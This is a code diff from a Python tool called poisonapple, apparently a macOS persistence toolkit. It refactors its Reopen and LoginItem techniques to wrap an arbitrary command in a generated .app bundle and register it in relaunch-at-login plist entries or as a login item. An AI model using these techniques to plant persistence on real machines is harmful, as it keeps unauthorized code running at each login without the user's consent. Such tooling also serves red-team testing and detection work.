@@ -3,7 +3,7 @@
 import os
 
 from poisonapple.util import (
-    print_status, get_full_path, create_cron_job, remove_line,
+    print_status, get_full_path, create_cron_job, remove_line, create_app,
     get_plist, write_plist, plist_launch_write, plist_launch_uninstall,
 )
 
@@ -253,15 +253,14 @@ class Reopen(Technique):
 
     @Technique.execute
     def run(self):
-        if not self.command.lower().endswith('.app'):
-            print_status('warning', text='Reopen command should end with .app in order to function properly!')
+        app_path = create_app(self.name, 'Reopen', command=self.command)
         for path in self.get_plist_paths():
             plist_data = get_plist(path)
             plist_data['TALAppsToRelaunchAtLogin'].append(
                 {
                     'Hide': False,
                     'BundleID': self.name,
-                    'Path': self.command,
+                    'Path': app_path,
                     'BackgroundState': 2
                 }
             )
@@ -283,19 +282,7 @@ class LoginItem(Technique):
 
     @Technique.execute
     def run(self):
-        auxiliary_path = get_full_path('auxiliary/')
-        app_path = os.path.join(auxiliary_path, f'{self.name}.app')
-        app_path_full = os.path.join(app_path, 'Contents/MacOS')
-        try:
-            os.makedirs(app_path_full)
-        except FileExistsError:
-            pass
-        with open(get_full_path('auxiliary/poisonapple.sh')) as f:
-            script_data = f.read().replace('$1', 'LoginItem')
-        app_path_script = os.path.join(app_path_full, self.name)
-        with open(app_path_script, 'w') as f:
-            f.write(script_data)
-        os.chmod(app_path_script, 0o755)
+        app_path = create_app(self.name, 'LoginItem', command=self.command)
         login_items_add_path = get_full_path('auxiliary/login-items-add.sh')
         os.system(f'{login_items_add_path} {app_path}')
 
